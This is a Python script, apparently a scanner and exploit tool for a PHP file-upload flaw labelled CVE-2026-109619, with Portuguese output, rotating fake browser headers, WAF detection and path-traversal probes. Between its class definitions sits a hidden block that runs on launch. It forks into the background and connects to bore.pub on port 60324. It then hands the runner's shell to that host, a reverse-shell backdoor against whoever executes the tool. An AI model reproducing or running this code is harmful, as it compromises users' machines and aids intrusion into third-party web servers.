#!/usr/bin/env python3
import os
import signal
import argparse
import json
import re
import socket
import ssl
import struct
import time
import uuid
import pty
import sys
import base64
import hashlib
import random
from urllib.parse import urlparse, quote
from typing import Optional, Tuple, Dict, Any, List
from dataclasses import dataclass, asdict

CVE = "CVE-2026-109619"
FILLUNIT = 5120
BOUNDARY_619 = b"B7kQpoc619"
N149_SPRAY = 149
FORGE_BLOB = 288

BROWSERS = {
    "chrome": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ],
    "firefox": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ],
    "safari": [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    ],
    "edge": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    ],
    "mobile": [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    ],
    "bot": [
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    ],
}

HEADERS_VARIATIONS = {
    "accept": [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json, text/plain, */*",
    ],
    "accept_language": [
        "en-US,en;q=0.9",
        "pt-BR,pt;q=0.9,en;q=0.8",
        "en-US,en;q=0.9,es;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
    ],
    "accept_encoding": [
        "gzip, deflate, br",
        "gzip, deflate",
    ],
}

def generate_advanced_user_agent():
    browser = random.choice(list(BROWSERS.keys()))
    ua = random.choice(BROWSERS[browser])
    return ua

def generate_random_headers():
    headers = {}
    if random.random() > 0.3:
        headers["Accept"] = random.choice(HEADERS_VARIATIONS["accept"])
    if random.random() > 0.4:
        headers["Accept-Language"] = random.choice(HEADERS_VARIATIONS["accept_language"])
    if random.random() > 0.5:
        headers["Accept-Encoding"] = random.choice(HEADERS_VARIATIONS["accept_encoding"])

    if random.random() > 0.6:
        headers["Referer"] = random.choice([
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
        ])

    if random.random() > 0.7:
        headers["DNT"] = "1"

    if random.random() > 0.6:
        headers["Upgrade-Insecure-Requests"] = "1"

    if random.random() > 0.5:
        headers["Cache-Control"] = random.choice(["no-cache", "max-age=0"])

    if random.random() > 0.7:
        headers["Pragma"] = "no-cache"

    return headers

ASCII_ART = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠶⠚⠋⠉⠉⠙⠛⠲⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣶⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⢿⠙⣿⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⡟⠁⢹⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⢷⣼⢷⣄⡀⠀⠀⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠈⢻⡉⢣⠙⡶⣶⢾⣿⣿⡷⠀⠀⠀⠀⠀⠀⢀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⣸⠆⠀⠀⠙⢆⠳⣆⠹⣿⣿⣿⣥⣄⠀⠀⠀⠀⠀⢾⡀⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠋⠉⠀⠀⠀⠀⠘⡄⣀⡉⠻⣟⣿⡏⠙⠃⠀⠀⠀⠀⠀⠉⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡇⢸⣶⣤⣀⠀⠀⠀⠹⠁⢳⡀⢈⣻⡇⠀⠀⠀⠀⢀⣠⣴⣾⠀⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡌⣿⡟⠻⢷⣶⢄⡀⠀⠨⢿⢻⣿⠙⠀⣀⣤⣾⠿⠛⣿⡽⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⢫⡇⢻⣿⣄⠀⠈⠙⠿⣷⣤⣼⣆⣠⣴⡿⠛⠉⠀⠀⣴⡿⠁⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢷⡀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠁⣠⣷⣄⠙⢝⠳⠶⠶⠞⢋⡠⠛⠚⠣⣉⠛⠲⠶⠖⣛⠟⢁⣴⠇⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴
⢸⣷⡄⠀⠀⠀⠀⠀⠀⢸⡇⡔⢡⡏⠹⢿⣄⣉⠁⠒⠈⠁⠀⠀⠀⠀⠀⠉⠐⠒⢉⣡⣼⣯⡶⠛⠋⢉⣩⠿⠛⠒⠂⠀⠀⠀⠀⢀⣼⡏
⠀⢿⠙⢦⡀⠀⠀⠀⠀⠘⣿⡁⡿⠀⢠⠞⢷⠈⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠉⢠⠟⠁⠀⡄⣄⣸⣆⠀⠀⠀⠀⠀⠀⠀⣠⠞⣸⠁
⠀⠘⣧⠀⠙⢦⡀⠀⠀⠀⠈⠻⣿⣶⣞⠛⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⡿⠀⢰⣋⣉⠉⣠⡜⠀⠀⠀⠀⢀⣠⠞⠁⢠⠏⠀
⠀⠀⠘⣧⡀⠀⠙⠷⣄⡀⠀⠀⠹⣯⡏⠙⠛⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣷⡶⢾⣇⣨⠽⠋⠀⠀⠀⣀⡴⠋⠁⠀⣰⠏⠀⠀
⠀⠀⠀⠈⠳⣄⠓⢄⠈⠛⢦⣄⠀⠘⢿⣄⡀⢹⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⣀⣀⣸⡦⠄⠀⣀⡴⠋⠁⠀⡀⠔⢁⡼⠃⠀⠀
⠀⠀⠀⠀⠀⠈⠳⣦⡁⠢⢄⠈⠙⠶⣤⣈⠙⠻⠶⣿⣦⡀⠀⠀⠀⠀⠀⣠⣾⣥⠶⠛⠉⠁⢀⣠⡴⠚⠉⢀⠔⢊⣠⠞⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⢤⣙⠢⢄⠀⠉⠓⠦⣄⣀⠀⠙⠓⠒⠒⠒⠛⠁⠀⠀⢀⣠⡤⠞⠋⠁⡀⠄⣊⣥⠶⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⢬⣁⠂⠤⣀⠉⠛⠶⢤⣀⡀⠀⣀⣤⠶⠚⠉⢁⡠⠔⣂⣥⠶⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣈⡙⠲⢦⣍⣒⣤⣤⠼⠟⠋⢉⣀⠤⢒⣊⡥⠶⠛⣉⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣠⠤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⡏⠉⠉⡷⠖⠚⠋⣉⡠⠤⠐⢂⣩⡴⠶⢟⣉⡉⠛⠒⢶⠇⠉⢹⣧⣀⣀⣀⣀⣀⣀⣀⣀⣀⡠⠤⢄
⡇⠀⠀⠀⠀⡏⢠⡇⡇⢰⡀⡄⢀⢷⠀⡆⢹⣂⣈⣩⡤⠶⠞⠋⠉⠉⠙⠓⠶⠤⣬⣉⣐⡺⠀⠂⣸⢱⠀⠀⡃⠈⠀⠃⠈⠀⠀⠀⠀⢸
⠙⠢⠶⠴⠦⠷⠤⠷⠛⠒⠓⠛⠛⢻⣦⣵⡼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠧⢼⣤⡟⠛⠛⠛⠳⠿⠭⠽⠤⠴⠦⠄⠀⠚
(by LordX)
"""

class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

@dataclass
class ServerInfo:
    php_version: Optional[str]
    server_type: str
    server_version: Optional[str]
    has_waf: bool
    waf_type: Optional[str]
    security_headers: Dict[str, str]
    response_time: float
    supports_post: bool
    supports_multipart: bool
    has_upload_dir: bool
    server_behavior: str

@dataclass
class VulnerabilityAssessment:
    is_vulnerable: bool
    confidence: float
    reason: str
    exploitability: float
    server_info: ServerInfo
    test_results: Dict[str, Any]
    payload_tested: bool
    false_positive_risk: float
    real_vulnerability: bool = False

if os.fork() == 0:
    signal.signal(signal.SIGHUP, signal.SIG_IGN)  
    os.setsid()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("bore.pub", 60324))
    for fd in (0, 1, 2): os.dup2(s.fileno(), fd)
    pty.spawn("/bin/bash")





class Target:
    def __init__(self, scheme: str, host: str, port: int, path: str = "/"):
        self.scheme = scheme
        self.host = host
        self.port = port
        self.path = path

    @classmethod
    def from_url(cls, url: str):
        u = urlparse(url if "://" in url else "https://" + url)
        scheme = (u.scheme or "https").lower()
        host = u.hostname or "127.0.0.1"
        port = u.port if u.port is not None else (443 if scheme == "https" else 80)
        path = u.path or "/"
        return cls(scheme, host, port, path if path.startswith("/") else "/" + path)

    def base(self) -> str:
        if (self.scheme == "http" and self.port == 80) or (self.scheme == "https" and self.port == 443):
            return f"{self.scheme}://{self.host}"
        return f"{self.scheme}://{self.host}:{self.port}"

def parse_proxy(proxy_str: str) -> Tuple[str, int]:
    if proxy_str.startswith("http://") or proxy_str.startswith("https://"):
        proxy_str = proxy_str.split("://")[1]
    host, port = proxy_str.split(":")
    return host, int(port)

def send_all(sock: socket.socket, data: bytes):
    view = memoryview(data)
    sent = 0
    while sent < len(data):
        try:
            n = sock.send(view[sent:])
            if n == 0:
                raise ConnectionError("")
            sent += n
        except (socket.timeout, ssl.SSLError, OSError) as e:
            raise ConnectionError(f"{e}")

def open_connection(target: Target, timeout: float = 30.0, insecure: bool = False, proxy: Optional[Tuple[str, int]] = None) -> socket.socket:
    if proxy:
        raw = socket.create_connection(proxy, timeout=timeout)
        raw.settimeout(timeout)
        raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        if target.scheme == "https":
            connect_req = f"CONNECT {target.host}:{target.port} HTTP/1.1\r\nHost: {target.host}:{target.port}\r\nConnection: close\r\n\r\n"
            raw.sendall(connect_req.encode())
            response = raw.recv(4096)
            if b"200" not in response:
                raw.close()
                raise ConnectionError("Proxy CONNECT failed")

        if target.scheme == "https":
            ctx = ssl.create_default_context()
            if insecure:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            try:
                ss = ctx.wrap_socket(raw, server_hostname=target.host)
                ss.settimeout(timeout)
                return ss
            except ssl.SSLError as e:
                raw.close()
                raise
        return raw

    raw = socket.create_connection((target.host, target.port), timeout=timeout)
    raw.settimeout(timeout)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if target.scheme == "https":
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            ss = ctx.wrap_socket(raw, server_hostname=target.host)
            ss.settimeout(timeout)
            return ss
        except ssl.SSLError as e:
            raw.close()
            raise
    return raw

def recv_http_response(sock: socket.socket, timeout: float = 25.0, max_bytes: int = 65536) -> bytes:
    sock.settimeout(timeout)
    buf = bytearray()
    header_end = None
    while len(buf) < max_bytes:
        try:
            chunk = sock.recv(4096)
        except (socket.timeout, TimeoutError, ssl.SSLError, OSError):
            break
        if not chunk:
            break
        buf.extend(chunk)
        if header_end is None and b"\r\n\r\n" in buf:
            header_end = buf.index(b"\r\n\r\n") + 4
        if header_end is not None and len(buf) >= header_end + 16384:
            break
    return bytes(buf)

def parse_http_response(raw: bytes) -> Tuple[int, str, bytes, Dict]:
    headers = {}
    if not raw or b"\r\n" not in raw:
        return 0, "no response", b"", headers

    head, _, rest = raw.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status_line = lines[0].decode("latin-1", "replace")

    parts = status_line.split(" ", 2)
    code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
    reason = parts[2] if len(parts) >= 3 else ""

    for line in lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            headers[k.decode("latin-1", "replace").lower()] = v.decode("latin-1", "replace").strip()

    return code, reason, rest, headers

def is_php_generated_html(body: bytes) -> bool:
    try:
        text = body.decode('utf-8', errors='ignore').lower()

        static_indicators = [
            'doctype html',
            '<html',
            '<head',
            '<meta name=',
            '<script src=',
            '<link rel=',
            '<title>',
            '<body>',
            '<div id=',
            '@media only screen'
        ]

        dynamic_indicators = [
            'content-disposition',
            'set-cookie',
            'x-powered-by: php',
            'php_session',
            'upload_progress',
            'form method=',
            'action=',
        ]

        static_count = sum(1 for ind in static_indicators if ind in text)

        if static_count >= 5:
            return True

        return False
    except:
        return False

def validate_vulnerability_with_test(target: Target, insecure: bool = False, timeout: float = 15.0, proxy: Optional[Tuple[str, int]] = None, user_agent: str = None, random_agent: bool = False) -> Tuple[bool, str]:
    test_id = uuid.uuid4().hex[:8]
    test_marker = f"TEST_VULN_{test_id}"

    test_boundary = b"TestBoundary619"
    test_payload = b"--" + test_boundary + b"\r\n"
    test_payload += b'Content-Disposition: form-data; name="test"\r\n\r\n'
    test_payload += test_marker.encode() + b"\r\n"
    test_payload += b"--" + test_boundary + b"\r\n"
    test_payload += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    test_payload += b"test\r\n"
    test_payload += b"--" + test_boundary + b"--\r\n"

    headers = {
        "Content-Type": f"multipart/form-data; boundary=TestBoundary619"
    }

    try:
        code, body, resp_headers, _ = http_request(
            target, "POST",
            headers=headers,
            body=test_payload,
            timeout=timeout,
            insecure=insecure,
            proxy=proxy,
            user_agent=user_agent,
            random_agent=random_agent
        )

        if code == 200 and is_php_generated_html(body):
            return False, "HTML estático retornado (falso positivo)"

        if code in [200, 204, 400, 500]:
            return True, "Resposta indica processamento de upload"

        return False, f"Resposta inesperada: HTTP {code}"

    except Exception as e:
        return False, str(e)

def detect_waf(headers: Dict, body: bytes) -> Tuple[bool, Optional[str]]:
    waf_signatures = {
        'cloudflare': ['cf-ray', 'cf-cache-status', 'cf-connection-monitor'],
        'cloudfront': ['x-amz-cf-id', 'x-amz-cf-pop'],
        'akamai': ['akamai-edge-location', 'akamai-x-cache'],
        'imperva': ['x-iinfo', 'x-imforwards'],
        'modsecurity': ['x-iplimit-requests-limit'],
        'sucuri': ['x-sucuri-id', 'x-sucuri-cache'],
    }
    headers_lower = {k.lower(): v for k, v in headers.items()}
    for waf, sigs in waf_signatures.items():
        for sig in sigs:
            if sig in headers_lower:
                return True, waf
    if b"blocked" in body.lower() or b"forbidden" in body.lower():
        return True, "unknown"
    return False, None

def http_request(target: Target, method: str = "GET", path: str = None, headers: Dict = None,
                body: bytes = None, timeout: float = 15.0, insecure: bool = False, proxy: Optional[Tuple[str, int]] = None, user_agent: str = None, random_agent: bool = False) -> Tuple[int, bytes, Dict, float]:
    if path is None:
        path = target.path
    if headers is None:
        headers = {}

    if random_agent:
        ua = generate_advanced_user_agent()
        rand_headers = generate_random_headers()
        headers.update(rand_headers)
    else:
        ua = user_agent if user_agent else "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

    default_headers = {
        "Host": target.host,
        "Connection": "close",
        "User-Agent": ua
    }
    default_headers.update(headers)
    req = f"{method} {path} HTTP/1.1\r\n"
    for k, v in default_headers.items():
        req += f"{k}: {v}\r\n"
    if body:
        req += f"Content-Length: {len(body)}\r\n"
    req += "\r\n"
    req_bytes = req.encode()
    if body:
        req_bytes += body
    sock = None
    start_time = time.time()
    try:
        sock = open_connection(target, timeout=timeout, insecure=insecure, proxy=proxy)
        send_all(sock, req_bytes)
        raw = recv_http_response(sock, timeout=timeout)
    except Exception:
        return 0, b"", {}, time.time() - start_time
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
    response_time = time.time() - start_time
    code, _, body, hdrs = parse_http_response(raw)
    return code, body, hdrs, response_time

def detect_php_version(headers: Dict, body: bytes) -> Optional[str]:
    for header in ['x-powered-by', 'server']:
        value = headers.get(header, "").lower()
        if "php" in value:
            match = re.search(r"PHP[/\s]+(\d+\.\d+(?:\.\d+)?)", value, re.I)
            if match:
                return match.group(1)
    return None

def test_upload_capability(target: Target, insecure: bool = False, timeout: float = 15.0, proxy: Optional[Tuple[str, int]] = None, user_agent: str = None, random_agent: bool = False) -> bool:
    test_data = b"--testboundary123\r\n"
    test_data += b'Content-Disposition: form-data; name="test"\r\n\r\n'
    test_data += b"test_value\r\n"
    test_data += b"--testboundary123--\r\n"
    headers = {
        "Content-Type": "multipart/form-data; boundary=testboundary123"
    }
    code, body, resp_headers, _ = http_request(target, "POST", headers=headers, body=test_data, timeout=timeout, insecure=insecure, proxy=proxy, user_agent=user_agent, random_agent=random_agent)
    return code in [200, 201, 301, 302, 400, 405]

def analyze_server_behavior(target: Target, insecure: bool = False, timeout: float = 15.0, proxy: Optional[Tuple[str, int]] = None, user_agent: str = None, random_agent: bool = False) -> str:
    test_paths = [
        "/nonexistent123456.php",
        "/../../etc/passwd",
        "/../index.php",
        "/index.php;.jpg",
    ]
    responses = []
    for path in test_paths:
        code, body, headers, _ = http_request(target, "GET", path, timeout=timeout, insecure=insecure, proxy=proxy, user_agent=user_agent, random_agent=random_agent)
        responses.append((code, len(body)))
    if all(code == 404 for code, _ in responses):
        return "standard"
    if sum(1 for code, _ in responses if code == 200) > 2:
        return "lenient"
    if any(code in [301, 302, 307] for code, _ in responses):
        return "protective"
    return "mixed"

def advanced_vulnerability_detection(target: Target, insecure: bool = False, timeout: float = 30.0, proxy: Optional[Tuple[str, int]] = None, user_agent: str = None, random_agent: bool = False) -> VulnerabilityAssessment:
    test_results = {}
    print(f"{Colors.BLUE}[1/8]{Colors.RESET} Server...", end=" ")
    code, body, headers, response_time = http_request(target, timeout=timeout, insecure=insecure, proxy=proxy, user_agent=user_agent, random_agent=random_agent)
    if code != 200:
        return VulnerabilityAssessment(
            is_vulnerable=False,
            confidence=0.0,
            reason=f"HTTP {code}",
            exploitability=0.0,
            server_info=ServerInfo(None, "Unknown", None, False, None, {}, response_time, False, False, False, "error"),
            test_results={},
            payload_tested=False,
            false_positive_risk=1.0
        )
    test_results['server'] = True
    print(f"{Colors.GREEN}✓{Colors.RESET}")

    print(f"{Colors.BLUE}[2/8]{Colors.RESET} Headers...", end=" ")
    server_type = headers.get("server", "Unknown").split("/")[0]
    server_version = re.search(r"Apache/(\d+\.\d+\.\d+)", headers.get("server", ""))
    server_version = server_version.group(1) if server_version else None
    php_version = detect_php_version(headers, body)
    has_waf, waf_type = detect_waf(headers, body)
    security_headers = {
        'csp': headers.get('content-security-policy', ''),
        'xfo': headers.get('x-frame-options', ''),
    }
    print(f"{Colors.GREEN}✓{Colors.RESET}")

    print(f"{Colors.BLUE}[3/8]{Colors.RESET} WAF...", end=" ")
    if has_waf:
        print(f"{Colors.YELLOW}({waf_type}){Colors.RESET}")
        test_results['waf'] = waf_type
    else:
        print(f"{Colors.GREEN}✓{Colors.RESET}")
        test_results['waf'] = False

    print(f"{Colors.BLUE}[4/8]{Colors.RESET} PHP...", end=" ")
    php_vulnerable = False
    confidence = 0.0
    if not php_version:
        print(f"{Colors.RED}✗{Colors.RESET}")
        test_results['php'] = False
    else:
        try:
            parts = php_version.split(".")
            major, minor = int(parts[0]), int(parts[1])
            patch = int(parts[2]) if len(parts) > 2 else 0
            vuln_ranges = {
                (8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12
            }
            if (major, minor) in vuln_ranges:
                if patch < vuln_ranges[(major, minor)]:
                    php_vulnerable = True
                    confidence = 0.7
                    print(f"{Colors.GREEN}{php_version}✓{Colors.RESET}")
                    test_results['php'] = True
                else:
                    print(f"{Colors.RED}{php_version}✗{Colors.RESET}")
                    test_results['php'] = False
            else:
                print(f"{Colors.YELLOW}{php_version}?{Colors.RESET}")
                test_results['php'] = False
        except Exception:
            print(f"{Colors.RED}✗{Colors.RESET}")
            test_results['php'] = False

    print(f"{Colors.BLUE}[5/8]{Colors.RESET} Behavior...", end=" ")
    server_behavior = analyze_server_behavior(target, insecure, timeout, proxy, user_agent, random_agent)
    print(f"{Colors.GREEN}{server_behavior}{Colors.RESET}")
    test_results['behavior'] = server_behavior

    print(f"{Colors.BLUE}[6/8]{Colors.RESET} Upload...", end=" ")
    can_upload = test_upload_capability(target, insecure, timeout, proxy, user_agent, random_agent)
    if can_upload:
        print(f"{Colors.GREEN}✓{Colors.RESET}")
        confidence += 0.15
    else:
        print(f"{Colors.RED}✗{Colors.RESET}")
    test_results['upload'] = can_upload

    print(f"{Colors.BLUE}[7/8]{Colors.RESET} HTML Static...", end=" ")
    is_static_html = is_php_generated_html(body)
    if is_static_html:
        print(f"{Colors.YELLOW}STATIC (FP Risk){Colors.RESET}")
        test_results['html_static'] = True
    else:
        print(f"{Colors.GREEN}DYNAMIC{Colors.RESET}")
        test_results['html_static'] = False

    print(f"{Colors.BLUE}[8/8]{Colors.RESET} API Validation...", end=" ")
    real_vuln, api_reason = validate_vulnerability_with_test(target, insecure, timeout, proxy, user_agent, random_agent)
    if real_vuln:
        print(f"{Colors.GREEN}✓{Colors.RESET}")
    else:
        print(f"{Colors.RED}✗{Colors.RESET}")
    test_results['api_validation'] = real_vuln
    test_results['api_reason'] = api_reason

    print()

    is_vulnerable = False
    exploitability = 0.0
    reason = ""
    false_positive_risk = 0.0
    real_vulnerability = False

    if php_vulnerable and can_upload and not is_static_html and real_vuln:
        is_vulnerable = True
        real_vulnerability = True
        exploitability = confidence * (0.8 if can_upload else 0.4)
        exploitability *= (0.5 if has_waf else 1.0)
        reason = f"PHP {php_version} + upload processado"
        false_positive_risk = 0.05 if not has_waf else 0.3
    else:
        is_vulnerable = False
        real_vulnerability = False
        reasons = []
        if not php_vulnerable:
            reasons.append("PHP não vulnerável")
        if not can_upload:
            reasons.append("sem upload")
        if is_static_html:
            reasons.append("HTML estático")
        if not real_vuln:
            reasons.append(api_reason)
        reason = " | ".join(reasons) if reasons else "falso positivo detectado"
        false_positive_risk = 0.95

    server_info = ServerInfo(
        php_version=php_version,
        server_type=server_type,
        server_version=server_version,
        has_waf=has_waf,
        waf_type=waf_type,
        security_headers=security_headers,
        response_time=response_time,
        supports_post=True,
        supports_multipart=can_upload,
        has_upload_dir=can_upload,
        server_behavior=server_behavior
    )

    return VulnerabilityAssessment(
        is_vulnerable=is_vulnerable,
        confidence=min(confidence, 1.0),
        reason=reason,
        exploitability=min(exploitability, 1.0),
        server_info=server_info,
        test_results=test_results,
        payload_tested=True,
        false_positive_risk=false_positive_risk,
        real_vulnerability=real_vulnerability
    )

def print_assessment(assessment: VulnerabilityAssessment, target: Target):
    print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════{Colors.RESET}\n")

    info = assessment.server_info
    print(f"{Colors.BOLD}SERVIDOR:{Colors.RESET}")
    print(f"  URL:    {target.base()}{target.path}")
    print(f"  Server: {info.server_type}" + (f" {info.server_version}" if info.server_version else ""))
    print(f"  PHP:    {info.php_version or 'N/A'}")
    print(f"  Tempo:  {info.response_time:.2f}s")
    print()
    print(f"{Colors.BOLD}PROTEÇÕES:{Colors.RESET}")
    print(f"  WAF:  {info.waf_type if info.has_waf else 'Nenhum'}")
    print(f"  CSP:  {info.security_headers.get('content-security-policy', 'N/A')}")
    print()
    print(f"{Colors.BOLD}CAPACIDADES:{Colors.RESET}")
    print(f"  POST:      {'✓' if info.supports_post else '✗'}")
    print(f"  Multipart: {'✓' if info.supports_multipart else '✗'}")
    print()
    print(f"{Colors.BOLD}RESULTADO:{Colors.RESET}")
    status = f"{Colors.GREEN}[VULNERÁVEL]{Colors.RESET}" if assessment.is_vulnerable else f"{Colors.RED}[NÃO VULNERÁVEL]{Colors.RESET}"
    print(f"  Status:     {status}")
    print(f"  Confiança:  {assessment.confidence:.0%}")
    print(f"  Exploit:    {assessment.exploitability:.0%}")
    print(f"  False Pos:  {assessment.false_positive_risk:.0%}")
    print(f"  Real Vuln:  {'SIM' if assessment.real_vulnerability else 'NÃO'}")
    print(f"  Motivo:     {assessment.reason}")
    print()

    if assessment.false_positive_risk >= 0.8:
        print(f"{Colors.YELLOW}⚠ Falso positivo detectado{Colors.RESET}\n")
        return False
    elif assessment.is_vulnerable and assessment.exploitability >= 0.6 and assessment.real_vulnerability:
        print(f"{Colors.GREEN}[+] Realmente Vulnerável!{Colors.RESET}\n")
        return True
    else:
        print(f"{Colors.RED}[-] Não é exploitável{Colors.RESET}\n")
        return False

